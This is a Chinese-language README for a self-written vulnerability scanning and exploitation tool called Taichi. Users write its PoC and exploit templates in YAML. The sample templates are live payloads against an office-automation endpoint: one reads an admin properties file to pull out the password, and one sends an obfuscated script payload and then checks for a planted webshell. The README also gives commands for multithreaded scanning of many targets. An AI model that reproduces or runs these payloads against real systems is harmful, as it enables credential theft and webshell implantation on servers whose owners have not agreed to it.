# Taichi

## 前言

之前写了几个poc，感觉代码有很多相似的地方，所以我寻思能不能写个大体框架，这样以后就不用改来改去了。当然，我也知道有nuclei这样成熟好用的工具，但是我还是想试试，所以就搞了一个这个。（大佬勿喷）

目前才搞了几天，测试的数量也不多，算是个雏形，所以会有很多bug，请见谅。如有bug或者建议欢迎联系我

## 介绍

我认为这个工具的核心就是可以自定义poc或者exp

## poc.yaml格式

```
#请求方式
- method:
  - method: "post"

#payload
- payload:
  - var: '{"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
  
#response包里的关键字
- word:
  - word:
      - "password"

#漏洞的位置
- url:
  - url : "/sys/ui/extend/varkind/custom.jsp"
```

例子中的payload

```
  - var: '{"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
```

可以随意变换为request包里的内容，例如:

```
  - a: 'aaaaaaaaaaa'
```

## exp.yaml格式

```
#请求方式
- method:
  - method: "post"

#payload
- payload:
  - s_bean: 'ruleFormulaValidate&script=u0067\u0020\u003d\u0020\u0074\u0072\u0075\u0065\u003b\u0020\u007d\u0069\u0066\u0020\u0028\u0066\u006c\u0061\u0067\u0029\u0020\u007b\u0020\u0062\u0072\u0065\u0061\u006b\u003b\u0020\u007d\u0020\u007d\u0069\u0066\u0020\u0028\u0066\u006c\u0061\u0067\u0029\u0020\u007b\u0020\u0062\u0072\u0065\u0061\u006b\u003b\u0020\u007d\u0020\u007d\u0020\u0063\u0061\u0074\u0063\u0068\u0020\u0028\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0020\u0065\u0029\u0020\u007b\u0020\u0063\u006f\u006e\u0074\u0069\u006e\u0075\u0065\u003b\u0020\u007d\u0020\u007d'

#response包里的关键字
- word:
  - word:
      - "0xold6"

#漏洞的位置
- url:
  - url : "/sys/ui/extend/varkind/custom.jsp"

#attack中 验证 是否攻击成功的 请求方式
- method-V:
  - method: "get"

#webshell位置
- verify:
  - verify : "/login_listyes.jsp"
```

同理，payload内容也是可以变的

### 注意：yaml文件中参数的位置不可以改变

## 使用方法

```
python3 Taichi.py -h
usage: Taichi.py [-h] [-rh remote_host] [-f file_path] [-o outfile_path]
                 [-t thread_num] [-p poc_path] [-e exp_path]

Scan by atk7r

options:
  -h, --help            show this help message and exit
  -rh remote_host, --rhost remote_host
                        Please input host to scan.
  -f file_path, --file file_path
                        Please input file path to scan.
  -o outfile_path, --outfile outfile_path
                        Please input path for output file.
  -t thread_num, --thread thread_num
                        Please input thread number.
  -p poc_path, --poc poc_path
                        Please input poc path to scan.
  -e exp_path, --exp exp_path
                        Please input exp path to scan.
```

### 扫描单个目标

```
python3 Taichi.py -rh 123.123.123.123 -e exp.yaml
python3 Taichi.py -rh 123.123.123.123 -p poc.yaml
```

### 扫描多个目标

```
python3 Taichi.py -f target.txt -e exp.yaml/-p poc.yaml -o result.txt
```

### 多线程扫描

```
python3 Taichi.py -f target.txt -e exp.yaml/-p poc.yaml -o result.txt -t 5
```

